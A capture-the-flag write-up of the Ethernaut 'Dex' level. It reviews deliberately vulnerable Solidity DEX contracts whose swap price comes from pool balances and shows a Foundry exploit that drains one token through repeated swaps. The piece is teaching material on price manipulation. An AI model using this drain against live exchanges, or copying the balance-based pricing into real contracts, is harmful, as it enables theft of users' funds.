---
title: 'Ethernaut Challenge #21 Solution — Dex'
excerpt: This is Part 21 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>The goal of this challenge is to be able to steal all the tokens inside the Dex. The level starts with the Dex owning (as liquidity) 100 tokens of both `token1` and `token2` while we own just 10 of each.
coverImage:
  url: '/assets/blog/ethernaut/dex.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-08-11T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/dex.svg'
---

This is Part 21 of the ["Let’s play OpenZeppelin Ethernaut CTF"](https://stermi.xyz/blog/lets-play-openzeppelin-ethernaut) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

## Challenge #21: Dex

> The goal of this level is for you to hack the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_exchange) contract below and steal the funds by price manipulation.
>
> You will start with 10 tokens of `token1` and 10 of `token2`. The DEX contract starts with 100 of each token.
>
> You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
>
> Quick note
>
> Normally, when you make a swap with an ERC20 token, you have to `approve` the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the `approve` method to the contract itself. So feel free to use `contract.approve(contract.address, <uint amount>)` instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the `SwappableToken` contract otherwise.
>
> Things that might help:
>
> - How is the price of the token calculated?
> - How does the `swap` method work?
> - How do you `approve` a transaction of an ERC20?
>
> Level author(s): [Patrick Collins](http://alphachain.io/blogs/)

The goal of this challenge is to be able to steal all the tokens inside the Dex. The level starts with the Dex owning (as liquidity) 100 tokens of both `token1` and `token2` while we own just 10 of each.

## Study the contracts

The challenge is made of two different contracts, let's give a review of them.

### `SwappableToken.sol`

```solidity
contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(
        address owner,
        address spender,
        uint256 amount
    ) public returns (bool) {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

This is a simple `ERC20` token that mint an `initialSupply` (specified as an input of the `constructor`) to the `msg.sender` and have overridden the `approve` function to prevent the `_dex` address to be able to approve any token.

Nothing special to see here

### `Dex.sol`

The contract implements the basic functionalities of a [Dex (Decentralized Exchange)](https://en.wikipedia.org/wiki/Decentralized_finance#Decentralized_exchanges). It allows the `owner` of the Dex to provide liquidity of a pair of tokens `token1` and `token2` without applying any fee when those tokens are exchanged by the end user.
The end user will use the Dex to `swap` (sell) a specific amount of one token to get back a `swapAmount` (depending on the Dex's token price) of the other token.

Let's review all the functions

#### `function setTokens(address _token1, address _token2) public onlyOwner`

```solidity
function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
}
```

This function allows the owner of the Dex platform to set the address of `token1` and `token2`. The function correctly check that only the `owner` of the Dex can call this function. It would also make sense to prevent the `owner` to change those addresses when supply for those tokens is already provided (otherwise the old tokens would be stuck in the contract forever).

#### `function approve(address spender, uint256 amount) public`

```solidity
function approve(address spender, uint256 amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
}
```

This is a more utility function that allows the end user to approve a `spender` to manage an `amount` of both token. Nothing strange here. You could achieve the same result by directly calling the `token1` and `token2` `approve` function passing the same parameters, as I said it's just a utility function that make the life of the end user just easier.

### `function balanceOf(address token, address account) public view returns (uint256)`

```solidity
function balanceOf(address token, address account) public view returns (uint256) {
    return IERC20(token).balanceOf(account);
}
```

Simple utility function to get the user's balance of a specific token address.

### `function swap(address from, address to, uint256 amount) public`

```solidity
function swap(
  address from,
  address to,
  uint256 amount
) public {
  require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
  require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
  uint256 swapAmount = getSwapPrice(from, to, amount);
  IERC20(from).transferFrom(msg.sender, address(this), amount);
  IERC20(to).approve(address(this), swapAmount);
  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

This is the function responsible to swap (sell/buy) one token with another.
The first `require` that you see, check that you can only exchange `token1` for `token2` or vice versa.

After that, the Dex calculate the swap price. For a given `amount` of one token, how many of the other token is the user getting back?

Then it performs all the needed transfers

1. Transfer `amount` of sold token from the user to the Dex contract
2. Approve the Dex to manage `swapAmount` of token bought by the user
3. Transfer `swapAmount` amount from the Dex to the user

There are no checks needed about those amounts **if and only if** both `token1` and `token2` are a well-made implementation of the `ERC20` token standard. The current Dex is using for both token the OpenZeppelin ERC20 implementations, so if for example the Dex or the User do not have enough amount of tokens in their balance to perform the transfers the transaction will automatically revert

### `function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256)`

This is the **core and most important** function inside the whole Contract. This function is responsible to calculate the price of the swap. How many tokens of `tokenX` is the user getting when a swap operation of `tokenY` is performed?

The current implementation inside the Dex is using token balances to calculate the price and, as a consequence, the amount of token that will be received by the user.

Why is this a problem? Using the balance as a factor to calculate the price will make your contract keen to an attack called **"price manipulation"** and unfortunately (but not related only to this simple balance case) it's not so uncommon.

The formula used to calculate the amount of token that the user will receive as the result of the swap operation is this `((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)))`

This formula tells you how many `to` tokens are you going to get when you send `amount` of `from` tokens. Lower is the balance of `from` (compared to the balance of `to`), higher is the amount of `to`.

This Dex does not use an external [Oracle](https://ethereum.org/en/developers/docs/oracles/) (like [Chainlink](https://chain.link/education/blockchain-oracles)) or [Uniswap TWAP](https://docs.uniswap.org/protocol/concepts/V3-overview/oracle) (time weighted average price) to calculate the swap price. Instead, it is using the balance of the token to calculate it, and we can leverage this.

In Solidity, there is a known problem called "rounding error". This problem is introduced by the fact that all integer division rounds down to the nearest integer. This mean that if you perform `5/2` the result won't be `2.5` but `2`.

To make an example, if we sell 1 `token1` but `token2*amount < token1` we will get **0** `token2` back! Basically **we would be selling a token to get zero back**!

If you want to know more regarding oracles and price manipulation and understand which are the possible solutions to prevent it, I suggest you to read all of these well-made resources:

- [OpenZeppelin: The Dangers of Price Oracles in Smart Contracts](https://www.youtube.com/watch?v=YGO7nzpXCeA)
- [OpenZeppelin: Smart Contract Security Guidelines #3: The Dangers of Price Oracles](https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/)
- [samczsun: So you want to use a price oracle](https://samczsun.com/so-you-want-to-use-a-price-oracle/)
- [cmichel: Pricing LP tokens | Warp Finance hack](https://cmichel.io/pricing-lp-tokens/)

## Solution code

After understanding which the problem is, let's see the solution of the challenge

```solidity
function exploitLevel() internal override {
  vm.startPrank(player, player);

  // Approve the dex to manage all of our token
  token1.approve(address(level), 2**256 - 1);
  token2.approve(address(level), 2**256 - 1);

  // To drain the dex our goal is to make the balance of `tokenIn` much lower compared to balance of `tokenOut`
  swapMax(token1, token2);
  swapMax(token2, token1);
  swapMax(token1, token2);
  swapMax(token2, token1);
  swapMax(token1, token2);

  // After all these swaps the current situation is like this
  // Player Balance of token1 -> 0
  // Player Balance of token2 -> 65
  // Dex Balance of token1 -> 110
  // Dex Balance of token2 -> 45
  // If we tried to swap all the 65 token2 we would get back 158 token1
  // but the transaction would fail because the Dex does not have enough
  // balance to execute the transfer
  // So we need to calculate the amount of token2 to sell in order to get back 110 token1
  // 110 token1 = amountOfToken2ToSell * DexBalanceOfToken1 / DexBalanceOfToken2
  // 110 = amountOfToken2ToSell * 110 / 45
  // amountOfToken2ToSell = 45

  level.swap(address(token2), address(token1), 45);

  assertEq(token1.balanceOf(address(level)) == 0 || token2.balanceOf(address(level)) == 0, true);

  vm.stopPrank();
}

function swapMax(ERC20 tokenIn, ERC20 tokenOut) public {
  level.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(player));
}
```

You can read the full solution of the challenge opening [Dex.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/Dex.t.sol)

## Further reading

- [OpenZeppelin: The Dangers of Price Oracles in Smart Contracts](https://www.youtube.com/watch?v=YGO7nzpXCeA)
- [OpenZeppelin: Smart Contract Security Guidelines #3: The Dangers of Price Oracles](https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/)
- [samczsun: So you want to use a price oracle](https://samczsun.com/so-you-want-to-use-a-price-oracle/)
- [cmichel: Pricing LP tokens | Warp Finance hack](https://cmichel.io/pricing-lp-tokens/)
- [Ethereum Docs: Oracles](https://ethereum.org/en/developers/docs/oracles/)
- [Chainlink: What Is a Blockchain Oracle?](https://chain.link/education/blockchain-oracles)
- [Uniswap TWAP](https://docs.uniswap.org/protocol/concepts/V3-overview/oracle)
- [Consensys: Integer Division](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/integer-division/)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
